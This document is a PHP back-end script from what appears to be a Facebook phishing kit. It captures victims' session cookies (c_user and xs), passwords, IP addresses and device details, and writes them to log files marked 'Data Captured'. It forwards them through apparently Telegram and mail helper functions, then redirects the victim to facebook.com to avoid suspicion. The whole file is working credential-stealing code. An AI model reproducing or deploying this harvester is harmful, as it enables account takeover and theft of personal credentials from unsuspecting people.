<?php
include "telegram.php";
include "mail.php";
include "filename.php";

function get_client_ip()
{
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) {
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_X_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    } else if (isset($_SERVER['HTTP_FORWARDED_FOR'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    } else if (isset($_SERVER['HTTP_FORWARDED'])) {
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    } else if (isset($_SERVER['REMOTE_ADDR'])) {
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    } else {
        $ipaddress = 'UNKNOWN';
    }

    return $ipaddress;
}
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // The request is using the POST method
    $c_user = $_POST["c_user"];
    $xs = $_POST["xs"];
    $ip_address = get_client_ip();
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $ctime = date("m/d/Y h:i:s a", time());
    if (isset($_POST["password"])) {
        $password = $_POST["password"];
        file_put_contents($filename, "*********Data Captured**********\nC_USER: $c_user\nXS: $xs\nPassword: $password\nIP-Address: $ip_address\nDevice: $user_agent\nTime: $ctime\n------------------------------\n\n", FILE_APPEND);
        file_put_contents("usernames.txt", "*********Data Captured**********\nC_USER: $c_user\nXS: $xs\nPassword: $password\nIP-Address: $ip_address\nDevice: $user_agent\nTime: $ctime\n------------------------------\n\n");
    } else {
        file_put_contents($filename, "*********Data Captured**********\nC_USER: $c_user\nXS: $xs\nIP-Address: $ip_address\nDevice: $user_agent\nTime: $ctime\n------------------------------\n\n", FILE_APPEND);
        file_put_contents("usernames.txt", "*********Data Captured**********\nC_USER: $c_user\nXS: $xs\nIP-Address: $ip_address\nDevice: $user_agent\nTime: $ctime\n------------------------------\n\n");
    }
    sendMessage();
    sendMail();
    $url = "https://facebook.com";
    header("Location: $url");
    exit();
} else {
    echo "Hello world";
}
?>